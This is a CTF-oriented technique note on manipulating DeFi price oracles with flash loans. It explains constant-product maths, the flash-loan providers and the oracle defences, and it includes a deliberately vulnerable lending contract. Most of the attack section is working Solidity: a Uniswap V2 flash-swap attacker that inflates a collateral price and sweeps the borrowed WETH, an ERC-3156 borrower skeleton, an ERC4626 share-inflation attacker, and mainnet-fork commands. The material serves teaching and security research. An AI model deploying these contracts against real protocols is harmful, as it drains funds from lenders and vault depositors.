---
title: "Price Oracle Manipulation and Flash Loans"
category: blockchain
subcategory: defi
type: technique
tags: [blockchain, defi, oracle, flash-loan, price-manipulation, uniswap, getreserves, spot-price, twap, chainlink, aave, balancer, amm, constant-product, lending, liquidation, foundry, solidity, evm]
difficulty: hard
summary: "Any price read from a pool's instantaneous reserves is attacker-controlled; a flash loan gives you the capital to move it inside one transaction."
when_to_use:
  - "A contract prices an asset with getReserves(), balanceOf(pool) or getAmountsOut()"
  - "Collateral value or share price depends on a single DEX pool"
  - "A flash loan / flash mint provider exists on the challenge chain"
  - "An LP token, vault share or rebasing balance is used as collateral"
tools: [foundry, forge, cast, anvil]
related: [reentrancy, integer-overflow, attacker-contract-patterns, solidity-vuln-checklist]
---

## TL;DR

A DEX spot price is just a ratio of two balances. Borrow a huge amount atomically, swap to skew the
ratio, let the victim read the skewed price, profit, swap back, repay the loan in the same
transaction. Capital requirement: gas only.

## Recognise it

- `(uint112 r0, uint112 r1, ) = pair.getReserves(); price = r1 * 1e18 / r0;`
- `price = token.balanceOf(address(pool)) * 1e18 / other.balanceOf(address(pool));`
- `router.getAmountsOut(amount, path)[1]` used as a valuation.
- `vault.totalAssets() / vault.totalSupply()` where `totalAssets` is `balanceOf(this)`.
- LP-token pricing as `(reserve0 * p0 + reserve1 * p1) / totalSupply` (the "fair LP" pitfall).
- A lending market with `getCollateralValue()` that never consults a TWAP or Chainlink feed.
- The challenge ships a `FlashLoanProvider`, `ERC3156` `flashLoan`, or a Uniswap V2 pair (whose
  `swap()` *is* a flash loan via the callback).
- `Setup.isSolved()` == "drain the pool" / "your balance > X".

## Theory

### Constant product maths

Uniswap V2: `x * y = k`, with a 0.3% fee. Swapping `dx` in gives

`dy = (dx * 997 * y) / (x * 1000 + dx * 997)`

After the swap the reserves are `(x + dx, y - dy)`, so the spot price `y/x` moves by roughly a
factor of `(x/(x+dx))**2`. With `dx = 100 * x` you move the price by ~4 orders of magnitude. The
pool always rebalances back when you swap in the other direction, minus fees - so a round trip
costs only the fee and any slippage you inflict on yourself.

### Why a flash loan matters

You need the capital only for the duration of one transaction. Providers:

- **Uniswap V2 `swap()` with non-empty `data`** -> calls `uniswapV2Call` on the recipient; repay
  with the 0.3% fee inside the callback.
- **Uniswap V3 `flash()`** -> `uniswapV3FlashCallback`.
- **ERC-3156 `flashLoan(receiver, token, amount, data)`** -> `onFlashLoan`, must return
  `keccak256("ERC3156FlashBorrower.onFlashLoan")`.
- **Aave V3 `flashLoanSimple`** -> `executeOperation`, 0.05% premium.
- **Balancer V2 `flashLoan`** -> `receiveFlashLoan`, **zero fee**.
- **DAI flash mint** (`DssFlash`) -> zero fee, up to the configured line.
- CTF-local providers usually have **no fee at all** and a `require(balanceAfter >= balanceBefore)`.

### The three exploit shapes

1. **Inflate collateral**: pump the price of a token you hold, deposit it, borrow far more than it
   is worth, dump, repay the flash loan, keep the borrowed asset.
2. **Deflate the debt / buy cheap**: crash the price of the asset the protocol sells, buy at the
   crashed price, restore.
3. **Share-price / donation attack**: `deposit()` 1 wei to get 1 share, then transfer a large
   amount directly to the vault so `totalAssets` jumps. Every later depositor's
   `shares = assets * supply / totalAssets` rounds to zero and you redeem their deposit.

### Oracle hierarchy (what actually defends)

`spot price` < `block-level TWAP` < `30-min TWAP` < `Chainlink feed with staleness+deviation check`
< `several independent feeds with a median`. A V2 TWAP over a long window costs real capital across
many blocks to move; a V3 TWAP even more.

## Attack

1. Map the price path: which function reads which pool, with which decimals.
2. Compute the swap size that moves the price enough (or just use "all of it minus dust").
3. Write **one** contract that does: borrow -> swap -> interact -> swap back -> repay -> sweep.
   It must be one transaction; two transactions lets arbitrageurs/challenges reset state.
4. Verify on a fork, then fire.

## Code

### Vulnerable lending market

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 ts);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

/// Lends WETH against COLLAT, priced with the instantaneous pool ratio. BUG.
contract NaiveLending {
    IERC20 public immutable weth;
    IERC20 public immutable collat;
    IUniswapV2Pair public immutable pair;

    mapping(address => uint256) public deposited;   // collat units
    mapping(address => uint256) public borrowed;    // weth units

    constructor(address _weth, address _collat, address _pair) {
        weth = IERC20(_weth);
        collat = IERC20(_collat);
        pair = IUniswapV2Pair(_pair);
    }

    /// price of 1e18 COLLAT expressed in WETH, straight from the reserves
    function price() public view returns (uint256) {
        (uint112 r0, uint112 r1, ) = pair.getReserves();
        (uint256 rc, uint256 rw) = pair.token0() == address(collat)
            ? (uint256(r0), uint256(r1))
            : (uint256(r1), uint256(r0));
        require(rc > 0, "empty pool");
        return (rw * 1e18) / rc;
    }

    function deposit(uint256 amount) external {
        require(collat.transferFrom(msg.sender, address(this), amount), "transferFrom failed");
        deposited[msg.sender] += amount;
    }

    function borrow(uint256 amount) external {
        borrowed[msg.sender] += amount;
        uint256 collateralValue = (deposited[msg.sender] * price()) / 1e18;
        require(collateralValue >= (borrowed[msg.sender] * 150) / 100, "undercollateralised");
        require(weth.transfer(msg.sender, amount), "transfer failed");
    }
}
```

### Attacker contract (Uniswap V2 flash swap)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface INaiveLending {
    function deposit(uint256 amount) external;
    function borrow(uint256 amount) external;
    function price() external view returns (uint256);
}

contract OracleAttacker {
    IUniswapV2Pair public immutable pair;
    INaiveLending public immutable lending;
    IERC20 public immutable weth;
    IERC20 public immutable collat;
    address public immutable owner;

    constructor(address _pair, address _lending, address _weth, address _collat) {
        pair = IUniswapV2Pair(_pair);
        lending = INaiveLending(_lending);
        weth = IERC20(_weth);
        collat = IERC20(_collat);
        owner = msg.sender;
    }

    /// Entry point: flash-borrow most of the COLLAT side of the pool.
    function pwn(uint256 collatToBorrow, uint256 myCollat) external {
        require(msg.sender == owner, "not owner");
        bool collatIsToken0 = pair.token0() == address(collat);
        (uint256 out0, uint256 out1) = collatIsToken0
            ? (collatToBorrow, uint256(0))
            : (uint256(0), collatToBorrow);
        // non-empty data triggers the flash-swap callback
        pair.swap(out0, out1, address(this), abi.encode(myCollat));
    }

    /// Uniswap V2 callback. We hold `collatToBorrow` COLLAT right now.
    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data)
        external
    {
        require(msg.sender == address(pair), "not pair");
        uint256 loan = amount0 > 0 ? amount0 : amount1;
        uint256 myCollat = abi.decode(data, (uint256));

        // Reserves are now depleted of COLLAT -> price(COLLAT in WETH) is enormous.
        // Deposit our own COLLAT at that inflated valuation and borrow all the WETH.
        collat.approve(address(lending), type(uint256).max);
        lending.deposit(myCollat);
        uint256 available = weth.balanceOf(address(lending));
        lending.borrow(available);

        // Repay the flash swap: we must return `loan` COLLAT plus the 0.3% fee.
        // Buy it back with part of the WETH we just borrowed.
        uint256 repay = (loan * 1000) / 997 + 1;
        _swapWethForExactCollat(repay);
        require(collat.transfer(address(pair), repay), "repay failed");

        // keep the rest
        require(weth.transfer(owner, weth.balanceOf(address(this))), "sweep failed");
    }

    function _swapWethForExactCollat(uint256 collatOut) internal {
        (uint112 r0, uint112 r1, ) = pair.getReserves();
        bool collatIsToken0 = pair.token0() == address(collat);
        (uint256 rc, uint256 rw) = collatIsToken0 ? (uint256(r0), uint256(r1)) : (uint256(r1), uint256(r0));
        // amountIn for an exact amountOut, with the 0.3% fee
        uint256 amountIn = (rw * collatOut * 1000) / ((rc - collatOut) * 997) + 1;
        require(weth.transfer(address(pair), amountIn), "pay in failed");
        (uint256 o0, uint256 o1) = collatIsToken0 ? (collatOut, uint256(0)) : (uint256(0), collatOut);
        pair.swap(o0, o1, address(this), "");
    }
}
```

### ERC-3156 flash-loan receiver skeleton

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address a) external view returns (uint256);
}

interface IERC3156FlashLender {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data)
        external returns (bool);
    function maxFlashLoan(address token) external view returns (uint256);
    function flashFee(address token, uint256 amount) external view returns (uint256);
}

contract FlashBorrower {
    bytes32 private constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");

    IERC3156FlashLender public immutable lender;
    address public immutable owner;

    constructor(address _lender) {
        lender = IERC3156FlashLender(_lender);
        owner = msg.sender;
    }

    function go(address token) external {
        require(msg.sender == owner, "not owner");
        uint256 amount = lender.maxFlashLoan(token);
        lender.flashLoan(address(this), token, amount, "");
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        require(msg.sender == address(lender), "untrusted lender");
        require(initiator == address(this), "untrusted initiator");

        // ---- do the manipulation here with `amount` of `token` in hand ----

        IERC20(token).approve(address(lender), amount + fee);
        return CALLBACK_SUCCESS;
    }
}
```

### Vault donation / share-inflation attack

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address s, uint256 a) external returns (bool);
    function balanceOf(address a) external view returns (uint256);
}

interface IVault {
    function deposit(uint256 assets) external returns (uint256 shares);
    function redeem(uint256 shares) external returns (uint256 assets);
    function totalSupply() external view returns (uint256);
}

/// Classic ERC4626 first-depositor attack:
/// 1) deposit 1 wei  -> totalSupply == 1
/// 2) donate N       -> totalAssets == N + 1, one share is worth everything
/// 3) victim deposits M < N -> shares = M * 1 / (N+1) == 0
/// 4) redeem 1 share -> take everything
contract VaultInflator {
    function pwn(address vault, address asset, uint256 donation) external {
        IERC20(asset).approve(vault, type(uint256).max);
        IVault(vault).deposit(1);
        require(IVault(vault).totalSupply() == 1, "not first depositor");
        IERC20(asset).transfer(vault, donation);   // direct donation, no shares minted
    }

    function collect(address vault) external {
        IVault(vault).redeem(1);
    }
}
```

### Testing on a fork

```bash
# fork mainnet at a block where the pool exists, impersonate a whale for seed capital
anvil --fork-url "$MAINNET_RPC" --fork-block-number 19000000

# in forge tests:
#   vm.createSelectFork(vm.envString("MAINNET_RPC"), 19000000);
#   deal(WETH, attacker, 1 ether);           // cheat-code funding
#   vm.prank(WHALE); IERC20(USDC).transfer(attacker, 1_000_000e6);

forge test --fork-url "$MAINNET_RPC" --fork-block-number 19000000 -vvvv
```

## Variants & pitfalls

- **Round-trip cost**: every swap pays 0.3%. Moving 100x and back on a deep pool can cost more than
  you extract. Compute the profit before writing the contract.
- **`getAmountsOut` is the same spot price** wearing a hat.
- **`balanceOf(pool)` vs `getReserves()`**: `balanceOf` is manipulable by a plain `transfer`
  (donation), no swap and no flash loan needed. Always check whether a direct transfer is enough.
- **Rebasing / fee-on-transfer tokens** break `amount` accounting; `transferFrom(x)` may credit less
  than `x`. That alone is a separate bug class.
- **TWAP over one block is still a spot price.** V2 `price0CumulativeLast` sampled twice in the same
  transaction gives a zero time delta -> division by zero or a stale value.
- **Read-only reentrancy** in the pool's `get_virtual_price` (Curve) is a cheaper manipulation than
  a flash loan - see `reentrancy`.
- **Repaying the flash loan**: Uniswap V2 checks `k` after the callback with the fee applied; the
  exact repay amount is `ceil(loan * 1000 / 997)` when repaying in the same token.
- **Balancer's zero fee** makes the maths much friendlier if the challenge chain has it.
- **Slippage guards / deadlines** on the victim's own swaps can block you; check `amountOutMin`.
- **Two transactions do not work** if the challenge (or any bot) rebalances between them.

## Tools

- `forge test --fork-url` with `deal()`, `vm.prank()`, `vm.createSelectFork()`.
- `cast call <pair> "getReserves()(uint112,uint112,uint32)"` to snapshot reserves.
- `cast call <router> "getAmountsOut(uint256,address[])(uint256[])"` to sanity-check maths.

## References

- Uniswap V2 whitepaper / `UniswapV2Pair.sol` swap and flash-swap semantics.
- EIP-3156: Flash Loans.
- EIP-4626: Tokenized Vault Standard (see its security notes on the inflation attack).
